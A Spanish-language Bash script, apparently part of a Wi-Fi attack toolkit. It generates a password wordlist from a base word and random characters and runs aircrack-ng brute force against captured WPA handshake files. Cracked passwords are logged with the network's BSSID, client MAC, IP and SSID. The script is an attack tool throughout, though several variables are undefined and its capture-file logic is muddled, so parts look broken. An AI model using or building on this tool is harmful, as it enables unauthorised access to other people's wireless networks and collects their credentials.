#!/bin/bash

sudo clear 


trap ctrl_c INT

function ctrl_c(){
	interfaz=$(sudo iw dev | grep 'Interface' | awk '{print$2}')

	echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
	rm dnsmasq.conf hostapd.conf 2>/dev/null
	rm -r iface 2>/dev/null
	find \-name datos-privados.txt | xargs rm 2>/dev/null
	sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
	iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
	ifconfig wlan0mon up 2>/dev/null; airmon-ng stop $interfaz > /dev/null 2>&1; sleep 1
	sudo systemctl restart NetworkManager
	exit 0
}


echo -e "\n 			INICIANDO GENERADOR DE PASSWORDS...."

lista="DDos_Network/PasswordsGenering.txt"


read -p "[+]Introduce una palabra base         : " base
read -p "[?]Cuantas Contraseñas desea generar  : " cant
read -p "[?]Longitud minima de las Contraseñas : " long

#caracteres adicionales
specialChar='@&?!+=*^%#'
allChar="A-Za-z0-9$specialChar"


if [ "$base" = " " ]; then

	for ((n=0; n<cant; n++)); do
		
		password=$(tr -dc "$allChar" < /dev/urandom | head -c $long); echo	
			
		echo "$password" >> "$lista"
		echo "[$password] >> [$lista]"
	
	done

else
	
	for ((n=0; n<cant; n++)); do

		password="${base}$(tr -dc "$allChar" < /dev/urandom | head -c $((long - ${#base})))"
		
		echo "$password" >> "$lista"
		echo "[$password] >> [$lista]"
	
	
	done
fi


echo "[+]Las Contraseñas han sido guardadas en ${lista}"
sleep 2
echo -e "\n			[!!]Pulse una tecla para iniciar el BRUTE FORCE!!"

read -n 1 -r -s -p ""

netSsid=$(grep "$bssid" tempNMCLI.txt | awk '{print$2, $3, $4}')

# Contar la cantidad de archivos con extensión .cap
cd DDos_Network/
count=$(find . -maxdepth 1 -type f -name '*.cap' | wc -l)

# Verificar si la cantidad es mayor que 1 
if [ $count -gt 1 ]; then
  echo -e "\n			[-]El archivo .cap se repite $count veces, CORRIGIENDO, POR FAVOR ESPERE..."
  echo "			[-]Asegurese de usar el archivo .cap correcto (contenedor del Handshake)!!"
  
  # Obtener la longitud de la variable count
  largo=${#count}
  
  if [ $largo -gt 1 ]; then
    
    	sudo aircrack-ng crack-${count}.cap -w $lista
    	

	output="../PasswordsFound.txt"
	
	wc ../PasswordsFound.txt | awk '{print$1}' > linetemp.txt

	line=$(<linetemp.txt)
			
	echo -e "\n		[+]LLenemos el Formulario: "

	read -p "				[+]ID--TEMP : " idTemporal	
	read -p "				[+]PASSWORD : " passFound
	read -p "				[+]IP--ADDR : " ipFound
			
	
			
	if [ -z $netSsid ]; then
		
			     
		echo " $((line - 2)) | $ipFound | $bssid | $macStation | $idTemporal |  (NULL)  | $passFound |" >> "$output"
	else

		echo " $((line - 2)) | $ipFound | $bssid | $macStation | $idTemporal | $netSsid | $passFound |" >> "$output"
	fi

	rm -f linetemp.txt

	echo "GUARDADO en "$output""
    	
  elif [ $largo -lt 2 ]; then
    
    	sudo aircrack-ng crack-0${count}.cap -w $lista
	
    	

	output="../PasswordsFound.txt"
	
	wc ../PasswordsFound.txt | awk '{print$1}' > linetemp.txt

	line=$(<linetemp.txt)
			
	echo -e "\n		[+]LLenemos el Formulario: "

	read -p "				[+]ID--TEMP : " idTemporal	
	read -p "				[+]PASSWORD : " passFound
	read -p "				[+]IP--ADDR : " ipFound
			
	
			
	if [ -z $netSsid ]; then
		
			     
		echo " $((line - 2)) | $ipFound | $bssid | $macStation | $idTemporal |  (NULL)  | $passFound |" >> "$output"
	else

		echo " $((line - 2)) | $ipFound | $bssid | $macStation | $idTemporal | $netSsid | $passFound |" >> "$output"
	fi

	rm -f linetemp.txt
	
	echo "GUARDADO en "$output""
	
  else
  
    	echo "			[!]Es posible que el bufer este lleno"
	read respuesta
	if [ $respuesta = 'y' ]; then

		rm -f *.netxml 
		rm -f *.csv 
		rm -f *.cap
		
		
		echo "			[+]Cache Borrado con Exito!"
		echo "			[+]Reinicie el Programa"
		echo "BYE.."
		sleep 2
		echo "	BYE..BYE"
	else 
		echo "			[!]Debera Borrar el Cache para que Aircrack-ng funcione correctamente"
		sleep 1
		echo "			[!]Caso Contrario, el script le asignara el archivo '.cap' incorrecto!"
		sleep 1
		echo "SALIENDO..."
		sleep 1
		exit 0
	fi 
  fi
  
else

    echo "			[❌️ ]No existe ningún archivo .cap dentro de la carpeta"
fi    




